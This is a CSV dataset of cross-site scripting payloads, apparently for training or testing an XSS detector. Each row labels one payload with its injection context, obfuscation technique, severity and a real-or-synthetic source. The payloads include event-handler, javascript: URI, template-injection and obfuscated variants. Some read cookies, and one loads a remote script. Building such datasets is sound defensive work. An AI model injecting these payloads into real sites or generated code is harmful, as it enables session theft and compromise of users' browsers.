payload,context,technique,severity,length,source
<button popovertarget=x>Click me</button><rb ontoggle=alert(1) popover id=x>AnonKryptiQuz</rb>,event_handler,none,medium,94,real
"<embed onmousedown=""alert(1)"">AnonKryptiQuz</embed>",event_handler,none,medium,51,real
"<dir onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></dir>",event_handler,none,medium,279,real
<a onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</a><input value=clickme>,event_handler,none,medium,93,real
"<script>throw/x/,onerror=Uncaught=eval,h=location.hash,e=Error,e.lineNumber=e.columnNumber=e.fileName=e.message=h[2]+h[1]+h,!!window.InstallTrigger?e:e.message</script>",script_injection,none,low,168,real
"<bdi onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</bdi>",event_handler,none,medium,65,real
"""><Img onLoaD=pRomPt('XSS')>",tag_injection,synthetic,medium,28,synthetic
<wbr onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,54,real
<svg><script>alert&lpar;'1'&rpar;,script_injection,none,low,33,real
"<base onmousemove=""alert(1)"">AnonKryptiQuz</base>",event_handler,none,medium,49,real
"<sup onmouseup=""alert(1)"">AnonKryptiQuz</sup>",event_handler,none,medium,45,real
"<div id=""92""><div style=""background:url(http://foo.f/f oo/;color:red/*/foo.jpg);"">X</div>//[""'`-->]]>]</div><div id=""93""><div style=""list-style:url(http://foo.f)\20url(javascript:alert(93));"">X</div>//[""'`-->]]>]</div>",js_uri,none,medium,218,real
"<rp onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</rp>",event_handler,none,medium,77,real
' onmous&#101;ov&#101;r=confirm(docum&#101;nt.cooki&#101;) ',attribute_escape,synthetic,medium,60,synthetic
""" ontoggle=alert(location.hash) """,attribute_escape,synthetic,medium,33,synthetic
"<DiV sTylE=""WidTH:100&#37;;HeIgHt:100vH&#59;"" oNpOINteROvEr=""var _0x1abc=['\x63','\x6F','\x6E','\x73','\x74','\x72','\x75','\x63','\x74','\x6F','\x72'];var _0x2bcd=['\x61','\x6C','\x65','\x72','\x74','\x28','\x64','\x6F','\x63','\x75','\x6D','\x65','\x6E','\x74','\x2E','\x64','\x6F','\x6D','\x61','\x69','\x6E','\x29'];[][_0x1abc.join('')][_0x1abc.join('')](_0x2bcd.join(''))((97^0)===97?1:0);""></dIV>",event_handler,html_entity|case_variation,low,402,real
"<style>@keyframes x{}</style><div style=""animation-name:x"" onanimationstart=""alert(1)""></div>",event_handler,none,medium,93,real
"<BODY BACKGROUND=""javascript:alert(3482)"">",js_uri,case_variation,medium,42,real
"<legend draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</legend>",event_handler,none,medium,88,real
"javascript:""/*'/*\""/*` /**/alert()//--></title></textarea></style></noscript></noembed></template></script><script>alert()</script><svg/<frame/onload=alert()>",script_injection,comment_injection,medium,158,real
"javascript:alert()//\ /*<svg/onload=';alert();'></textarea></style></title></noscript></template></noembed><frame onload="";alert();""></script>--><script>alert`;alert();`</script>*/alert()//\"";alert()//",script_injection,comment_injection,medium,201,real
"<div draggable=""true"" contenteditable>drag me</div><multicol ondrop=alert(1) contenteditable style=display:block>drop here</multicol>",event_handler,none,medium,133,real
' onerror=confirm(document.domain) ',attribute_escape,synthetic,medium,36,synthetic
%22 onerror=prompt(document.cookie) %22,attribute_escape,synthetic,medium,39,synthetic
%3Csvg onclick=console.log(document.cookie)%3E,tag_injection,synthetic,medium,46,synthetic
<form><input formaction=javascript:alert(1) type=image value=click>,js_uri,none,medium,67,real
"<svg onerror=alert(String.fromCharCode(88,83,83))/>",tag_injection,synthetic,medium,51,synthetic
"<style>@keyframes x{}</style><u style=""animation-name:x"" onanimationstart=""alert(1)""></u>",event_handler,none,medium,89,real
'confirm(document.domain)'>,dom_sink,none,medium,27,real
<script>prompt(docum&#101;nt.dom&#97;in)</script>,script_injection,synthetic,medium,49,synthetic
"&lt;IMG SRC=\""livescript&#058;&#91;code&#93;\""&gt;",generic,html_entity,low,50,real
"""javascript:confirm(0);"",",js_uri,none,medium,25,real
"')}, 1000); alert('AnonKryptiQuz')://",generic,none,medium,37,real
"<bdi draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</bdi>",event_handler,none,medium,64,real
<dl onpointerenter=alert(1) style=display:block>AnonKryptiQuz</dl>,event_handler,none,medium,66,real
<caption onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</caption><input value=clickme>,event_handler,none,medium,114,real
"document.write(""<img src=x onerror=prompt(document.cookie)>"")",dom_sink,synthetic,medium,61,synthetic
"<img src\x12=x onerror=""javascript:alert(3915)"">",event_handler,none,medium,48,real
confirm(<xss>xs{[function::status]}s</xss>),generic,none,medium,43,real
"""><Svg onErrOr=ConSolE.lOg('XSS')>",tag_injection,synthetic,medium,34,synthetic
"<style>:target {transform: rotate(180deg);}</style><span id=x style=""transition:transform 2s"" ontransitionrun=print()></span>",event_handler,none,low,125,real
"<a href=""\xE2\x80\x82javascript:javascript:alert(8231)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,82,real
<colgroup onpointerout=alert(1) style=display:block>AnonKryptiQuz</colgroup>,event_handler,none,medium,76,real
"<script>if(""x\\xE0\xB9\x92"".length==2) { javascript:alert(8897);}</script>",script_injection,none,medium,74,real
<a id=x tabindex=1 onactivate=alert(1)></a>,event_handler,none,medium,43,real
"<image3 oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,100,real
<body onload=alert(/AnonKryptiQuz/.source)>,event_handler,none,medium,43,real
"<noscript onmousedown=""alert(1)"">AnonKryptiQuz</noscript>",event_handler,none,medium,57,real
<frameset contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,62,real
"' oNtoGglE=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83)) '",attribute_escape,synthetic,medium,55,synthetic
"`""'><img src=xxx:x \x0Aonerror=javascript:alert(1)>",event_handler,none,medium,51,real
%3Csvg onbegin=console.log(document.domain)/%3E,tag_injection,synthetic,medium,47,synthetic
<script>alert`AnonKryptiQuz`</script>,script_injection,none,low,37,real
"""><svg onload=prompt(document.domain)>",tag_injection,synthetic,medium,38,synthetic
<button popovertarget=x>Click me</button><track onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</track>,event_handler,none,medium,106,real
"<label draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</label>",event_handler,none,medium,68,real
"<source onmouseup=""alert(1)"">AnonKryptiQuz</source>",event_handler,none,medium,51,real
""" onload=confirm(document.domain) """,attribute_escape,synthetic,medium,35,synthetic
"SetTimEouT(""ProMpt(doCumEnt.coOkiE)"",0)",dom_sink,synthetic,medium,39,synthetic
<bdo contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,57,real
"SetTimEouT(""ProMpt('XSS')"",0)",dom_sink,synthetic,medium,29,synthetic
"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">",tag_injection,comment_injection|case_variation,medium,49,real
"<rtc draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</rtc>",event_handler,none,medium,64,real
%22 onerror=alert(%27XSS%27) %22,attribute_escape,synthetic,medium,32,synthetic
"<footer onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</footer>",event_handler,none,medium,73,real
<time onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,54,real
"<style>@keyframes slidein {}</style><big style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></big>",event_handler,none,medium,160,real
<img src=/ onerror=alert(1)>,event_handler,none,medium,28,real
"<frameset onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</frameset>",event_handler,none,medium,69,real
"<div draggable=""true"" contenteditable>drag me</div><nav ondrop=alert(1) contenteditable>drop here</nav>",event_handler,none,medium,103,real
"<del oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</del>",event_handler,none,medium,69,real
"<style>:target {color: red;}</style><object id=x style=""transition:color 10s"" ontransitioncancel=print()></object>",event_handler,none,low,114,real
<dialog onfocusout=alert(1) tabindex=1 id=x></dialog><input autofocus>,event_handler,none,medium,70,real
"<html draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</html>",event_handler,none,medium,86,real
"<meta onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</meta>",event_handler,none,medium,61,real
"<style>:target {transform: rotate(180deg);}</style><spacer id=x style=""transition:transform 2s"" ontransitionrun=print()></spacer>",event_handler,none,low,129,real
"<video src=x onerror=""prompt(xss)"">",event_handler,none,medium,35,real
&#X000003C;,generic,html_entity,low,11,real
"<TABLE BACKGROUND=""javascript:alert('AnonKryptiQuz')"">",js_uri,case_variation,medium,54,real
"<basefont oncontextmenu=""alert(1)"">AnonKryptiQuz</basefont>",event_handler,none,medium,59,real
"<dd draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</dd>",event_handler,none,medium,77,real
<svG oNmoUseOveR=aLerT('XSS')>,tag_injection,synthetic,medium,30,synthetic
"""%3E%3Csvg onmouseenter=console.log(document.cookie)%3E",tag_injection,synthetic,medium,55,synthetic
"<a href=""\xC2\xA0javascript:javascript:alert(2762)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,78,real
"<optgroup onmouseout=""alert(1)"">AnonKryptiQuz</optgroup>",event_handler,none,medium,56,real
<svg><title onload=alert(1)></title>,event_handler,none,medium,36,real
"<img src=""1"" onerror=""&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;"" />",event_handler,html_entity,low,74,real
' oNerRor=coNsoLe.Log(loCatIon.haSh) ',attribute_escape,synthetic,medium,38,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><plaintext id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></plaintext>",event_handler,none,medium,188,real
"<sub draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</sub>",event_handler,none,medium,64,real
<footer onpointerover=alert(1) style=display:block>AnonKryptiQuz</footer>,event_handler,none,medium,73,real
%27 onmouseover=prompt(document.cookie) %27,attribute_escape,synthetic,medium,43,synthetic
%22 ontoggle=console.log(location.hash) %22,attribute_escape,synthetic,medium,43,synthetic
"<style>:target {color:red;}</style><bdi id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></bdi>",event_handler,none,medium,110,real
"ABC<div style=""x:\xE2\x80\x84expression(javascript:alert(1)"">DEF",js_uri,none,medium,64,real
"<style>@keyframes slidein {}</style><option style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></option>",event_handler,none,medium,172,real
"<marquee onclick=""alert(1)"" style=display:block>AnonKryptiQuz</marquee>",event_handler,none,medium,71,real
&#x03C;,generic,html_entity,low,7,real
"<col ondblclick=""alert(1)"">AnonKryptiQuz</col>",event_handler,none,medium,46,real
"<var onclick=""alert(1)"" style=display:block>AnonKryptiQuz</var>",event_handler,none,medium,63,real
"<svg draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</svg>",event_handler,none,medium,82,real
"<bdo onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</bdo>",event_handler,none,medium,65,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><style id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></style>",event_handler,none,medium,180,real
"<script src=""javascript:alert(1)"">",script_injection,none,medium,34,real
"`""'><img src=xxx:x onerror\x09=javascript:alert(1)>",js_uri,none,medium,51,real
<script>%(payload)s</script>,script_injection,none,low,28,real
<img onload=\u0061lert(document.cookie)/>,tag_injection,synthetic,medium,41,synthetic
"<body onunload=""javascript:alert('XSS');"">",event_handler,none,medium,42,real
"<div draggable=""true"" contenteditable>drag me</div><nav ondragover=alert(1) contenteditable>drop here</nav>",event_handler,none,medium,107,real
<svG oNfoCus=coNsoLe.Log(1)>,tag_injection,synthetic,medium,28,synthetic
"<div id=""138""><link rel=""import"" href=""test.svg"" />//[""'`-->]]>]</div><div id=""139""><iframe srcdoc=""&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;"" />//[""'`-->]]>]</div>undefined",tag_injection,none,low,192,real
<svG oNbeGin=coNfiRm(LocAtiOn.HasH)>,tag_injection,synthetic,medium,36,synthetic
"<hr oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,95,real
"<area onclick=""alert(1)"">AnonKryptiQuz</area>",event_handler,none,medium,45,real
<figcaption onpointerup=alert(1) style=display:block>AnonKryptiQuz</figcaption>,event_handler,none,medium,79,real
%22><svg onfocus=prompt(1)>,tag_injection,synthetic,medium,27,synthetic
"&lt;TABLE BACKGROUND=\""javascript&#058;alert('XSS')\""&gt;",generic,html_entity,medium,57,real
"%E5%98%8D%E5%98%8A%20""><img src=q onerror=alert(1)>",event_handler,url_encoding,medium,51,real
"<script>if(""x\\xE1\x96\x89"".length==2) { javascript:alert(1);}</script>",script_injection,none,medium,71,real
"<style>:target {color: red;}</style><td id=x style=""transition:color 10s"" ontransitioncancel=print()></td>",event_handler,none,low,106,real
'onfocus='alert(1)' autofocus=',event_handler,none,medium,31,real
"<spacer onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</spacer>",event_handler,none,medium,74,real
"<address oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,101,real
<summary onpointerover=alert(1) style=display:block>AnonKryptiQuz</summary>,event_handler,none,medium,75,real
"<svG oNloAd=AleRt(StrIng.frOmCHarCodE(88,83,83))>",tag_injection,synthetic,medium,49,synthetic
"<IMG LOWSRC=""javascript:alert('AnonKryptiQuz')"">",js_uri,case_variation,medium,48,real
<svg onfocus=confirm(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,medium,47,synthetic
"<pre onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</pre>",event_handler,none,medium,82,real
<a?/onclick=(confirm)(document.cookie)>Click Here!,event_handler,none,high,50,real
"<svg><animate attributeName=""xlink:href"" to=""javascript:alert('AnonKryptiQuz')"" /></svg>",js_uri,none,medium,88,real
<--`<img/src=`%20onerror=confirm``>%20--!>,event_handler,url_encoding,low,42,real
<object onpointermove=alert(1) style=display:block>AnonKryptiQuz</object>,event_handler,none,medium,73,real
A” autofocus onfocus=alert(“XSS”)//,event_handler,none,medium,35,real
"<div onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</div>",event_handler,none,medium,67,real
"<style>@keyframes slidein {}</style><strike style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></strike>",event_handler,none,medium,166,real
"<video oncontextmenu=""alert(1)"">AnonKryptiQuz</video>",event_handler,none,medium,53,real
"<kbd onmouseout=""alert(1)"">AnonKryptiQuz</kbd>",event_handler,none,medium,46,real
<param contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,59,real
"<dfn id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></dfn>",event_handler,none,medium,82,real
"<meter ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</meter>",event_handler,none,medium,91,real
"<basefont onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</basefont>",event_handler,none,medium,71,real
<u id=x tabindex=1 onfocusin=alert(1)></u>,event_handler,none,medium,42,real
"<li onclick=""alert(1)"">AnonKryptiQuz</li>",event_handler,none,medium,41,real
<script>prompt(loc&#97;tion.h&#97;sh)</script>,script_injection,synthetic,medium,46,synthetic
"<i onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</i>",event_handler,none,medium,63,real
"<s draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</s>",event_handler,none,medium,80,real
"<iframe xmlns=""http://www.w3.org/1999/xhtml"" src=""javascript:alert(125)""></iframe>",js_uri,none,medium,82,real
"<abbr oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</abbr>",event_handler,none,medium,71,real
"%22><svg onerror=console.log(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,60,synthetic
"<textarea onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</textarea>",event_handler,none,medium,78,real
' onload=confirm(document.domain) ',attribute_escape,synthetic,medium,35,synthetic
"<canvas onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</canvas>",event_handler,none,medium,85,real
"<noembed onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</noembed>",event_handler,none,medium,76,real
‘>alert(154)</script><script/154=’;;;;;;;,script_injection,none,medium,41,real
"<a oncontextmenu=""alert(1)"">AnonKryptiQuz</a>",event_handler,none,medium,45,real
"<title onmousedown=""alert(1)"">AnonKryptiQuz</title>",event_handler,none,medium,51,real
"<div draggable=""true"" contenteditable>drag me</div><details ondrop=alert(1) contenteditable>drop here</details>",event_handler,none,medium,111,real
"<progress onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</progress>",event_handler,none,medium,71,real
<tfoot onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,67,real
"<a href=""\x01javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,71,real
"""><Svg onLoaD=cOnfIrm('XSS')>",tag_injection,synthetic,medium,29,synthetic
"<style>@keyframes x{}</style><bdi style=""animation-name:x"" onanimationstart=""alert(1)""></bdi>",event_handler,none,medium,93,real
"<a onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></a>",event_handler,none,medium,275,real
"<frameset onFocus frameset onFocus=""javascript:javascript:alert(8187)""></frameset onFocus>",event_handler,none,medium,90,real
"<div draggable=""true"" contenteditable>drag me</div><rt ondragover=alert(1) contenteditable>drop here</rt>",event_handler,none,medium,105,real
"<style>:target {color:red;}</style><audio id=x style=""transition:color 1s"" ontransitionend=alert(1)></audio>",event_handler,none,medium,108,real
"<plaintext onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</plaintext>",event_handler,none,medium,75,real
"%22onmouseover=window[%27al%27%2B%27er%27%2B([%27t%27,%27b%27,%27c%27][0])](document[%27cooki%27%2B(['e','c','z'][0])]);%22",event_handler,url_encoding,low,123,real
' onmous&#101;&#101;nt&#101;r=consol&#101;.log('XSS') ',attribute_escape,synthetic,medium,55,synthetic
"<section onmouseover=""alert(1)"">AnonKryptiQuz</section>",event_handler,none,medium,55,real
"<head onmouseleave=""alert(1)"">AnonKryptiQuz</head>",event_handler,none,medium,50,real
<image src=validimage.png onload=alert(1)>,event_handler,none,medium,42,real
<output id=x tabindex=1 onfocusin=alert(1)></output>,event_handler,none,medium,52,real
"<i ondblclick=""alert(1)"">AnonKryptiQuz</i>",event_handler,none,medium,42,real
"<svG oNerRor=alErt(StRinG.fRomChaRCoDe(88,83,83))/>",tag_injection,synthetic,medium,51,synthetic
' onmous&#101;&#101;nt&#101;r=confirm(1) ',attribute_escape,synthetic,medium,42,synthetic
<dl onpointerup=alert(1) style=display:block>AnonKryptiQuz</dl>,event_handler,none,medium,63,real
<basefont id=x tabindex=1 onbeforeactivate=alert(1)></basefont>,event_handler,none,medium,63,real
""" oNmoUseOveR=cOnfIrm(doCumEnt.coOkiE) """,attribute_escape,synthetic,medium,40,synthetic
%27 onload=alert(%27XSS%27) %27,attribute_escape,synthetic,medium,31,synthetic
<IMG SRC=javascript:alert(&quot;XSS&quot;)>,js_uri,case_variation,medium,43,real
<ul id=x tabindex=1 onfocusin=alert(1)></ul>,event_handler,none,medium,44,real
<button popovertarget=x>Click me</button><br onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</br>,event_handler,none,medium,100,real
"<audio draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</audio>",event_handler,none,medium,83,real
"<style>:target {color:red;}</style><code id=x style=""transition:color 1s"" ontransitionend=alert(1)></code>",event_handler,none,medium,106,real
"<data onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</data>",event_handler,none,medium,63,real
{{_Vue.h.constructor`alert(1)`()}},template_injection,none,medium,34,real
"<li draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</li>",event_handler,none,medium,80,real
"<div draggable=""true"" contenteditable>drag me</div><shadow ondrop=alert(1) contenteditable>drop here</shadow>",event_handler,none,medium,109,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rb id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></rb>",event_handler,none,medium,174,real
"<figcaption onmouseover=""alert(1)"">AnonKryptiQuz</figcaption>",event_handler,none,medium,61,real
"<style>:target {color:red;}</style><ins id=x style=""transition:color 1s"" ontransitionstart=alert(1)></ins>",event_handler,none,medium,106,real
"Enter_Mouse_Pointer_Here_to_get_AnonKryptiQuz<P/onpointerenter=""alert(1)"">",event_handler,case_variation,medium,74,real
"<rtc draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</rtc>",event_handler,none,medium,59,real
"<div draggable=""true"" contenteditable>drag me</div><strong ondragover=alert(1) contenteditable style=display:block>drop here</strong>",event_handler,none,medium,133,real
"&lt;A HREF=\""http&#58;//%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\""&gt;AnonKryptiQuz&lt;/A&gt;",generic,html_entity|url_encoding,low,95,real
%3Cscript%3E//alert(location.hash)%3C/script%3E,script_injection,synthetic,medium,47,synthetic
“><iMg SrC=x onError​=prompt()>,tag_injection,case_variation,medium,31,real
javascript:confirm('XSS'),js_uri,synthetic,medium,25,synthetic
"document.write(""%3Cimg src=x onerror=alert(document.domain)%3E"")",dom_sink,synthetic,medium,64,synthetic
"<svg onfocus=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection,synthetic,medium,69,synthetic
"""%3E%3Csvg onload=console.log(document.cookie)%3E",tag_injection,synthetic,medium,49,synthetic
"<head draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</head>",event_handler,none,medium,64,real
<svG oNmoUseEntEr=ProMpt(1)/>,tag_injection,synthetic,medium,29,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><noembed id=x style=""position:absolute;"" onanimationcancel=""print()""></noembed>",event_handler,none,low,183,real
""" onb&#101;gin=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape,synthetic,medium,64,synthetic
<head onpointerenter=alert(1) style=display:block>AnonKryptiQuz</head>,event_handler,none,medium,70,real
"<link draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</link>",event_handler,none,medium,86,real
""" oNclIck=alErt('XSS') """,attribute_escape,synthetic,medium,24,synthetic
<aside onpointerout=alert(1) style=display:block>AnonKryptiQuz</aside>,event_handler,none,medium,70,real
"""><svg onmous&#101;&#101;nt&#101;r=prompt(docum&#101;nt.dom&#97;in)>",tag_injection,synthetic,medium,68,synthetic
"<;STYLE>;.XSS{background-image:url("";javascript:alert(';XSS';)"";);}<;/STYLE>;<;A CLASS=XSS>;<;/A>;",js_uri,none,medium,98,real
"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('AnonKryptiQuz');"">",event_handler,case_variation,medium,91,real
"<input onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</input>",event_handler,none,medium,72,real
<noembed onblur=alert(1) tabindex=1 id=x></noembed><input autofocus>,event_handler,none,medium,68,real
document.write(%22<img src=x onerror=console.log(document.cookie)>%22),dom_sink,synthetic,medium,70,synthetic
<main id=x tabindex=1 onbeforeactivate=alert(1)></main>,event_handler,none,medium,55,real
"""%3E%3Csvg onfocus=console.log(document.cookie)%3E",tag_injection,synthetic,medium,50,synthetic
<x #[_c.constructor`alert(1)`()]>,generic,none,medium,33,real
%3Csvg onerror=confirm(document.cookie)/%3E,tag_injection,synthetic,medium,43,synthetic
"javascript:/*""/*'/*\""/*`/*><frame src=javascript:alert()></template </textarea </title </style </noscript </noembed </script --><<script>alert()<</script>\ /**/alert()//",script_injection,comment_injection,medium,169,real
"<video onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</video>",event_handler,none,medium,85,real
"<area onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</area>",event_handler,none,medium,70,real
"<ol onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</ol>",event_handler,none,medium,59,real
"<img src\x09=x onerror=""javascript:alert(9260)"">",event_handler,none,medium,48,real
<img/anyjunk/onerror=alert(1) src=a>,event_handler,none,medium,36,real
<!--><script src=//14.rs>,script_injection,none,low,25,real
<svg><col onload=alert(1)></col>,event_handler,none,medium,32,real
"<abbr onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</abbr>",event_handler,none,medium,68,real
"<blockquote oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,104,real
%22 onmouseenter=console.log(document.domain) %22,attribute_escape,synthetic,medium,49,synthetic
"<body ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</body>",event_handler,none,medium,89,real
"<rtc onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</rtc>",event_handler,none,medium,67,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><col id=x style=""position:absolute;"" onanimationcancel=""print()""></col>",event_handler,none,low,175,real
"<fieldset onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</fieldset>",event_handler,none,medium,69,real
"eval(""prompt('XSS')"")",dom_sink,synthetic,medium,21,synthetic
"x"" onerror=alert('Qusai"") x=""",event_handler,none,medium,29,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><abbr id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></abbr>",event_handler,none,medium,178,real
<track onfocusout=alert(1) tabindex=1 id=x></track><input autofocus>,event_handler,none,medium,68,real
""";eval(unescape(location))//# %0Aalert(0)",dom_sink,encoding|url_encoding,high,41,real
<svg onclick=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)>,tag_injection,synthetic,medium,55,synthetic
"<style>:target {color:red;}</style><output id=x style=""transition:color 1s"" ontransitionstart=alert(1)></output>",event_handler,none,medium,112,real
"%27 onload=prompt(String.fromCharCode(88,83,83)) %27",attribute_escape,synthetic,medium,52,synthetic
"<ol onmouseover=""alert(1)"">AnonKryptiQuz</ol>",event_handler,none,medium,45,real
"<head onbeforecut=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</head>",event_handler,none,medium,85,real
"%3Csvg onbegin=confirm(String.fromCharCode(88,83,83))/%3E",tag_injection,synthetic,medium,57,synthetic
"<audio onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</audio>",event_handler,none,medium,85,real
"<svg:rect x=""0.0"" y=""0.0"" width=""0.373"" height=""0.3"" fill=""white""/>",tag_injection,none,low,67,real
"J&#97;VasCriPt:ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))",js_uri,synthetic,medium,57,synthetic
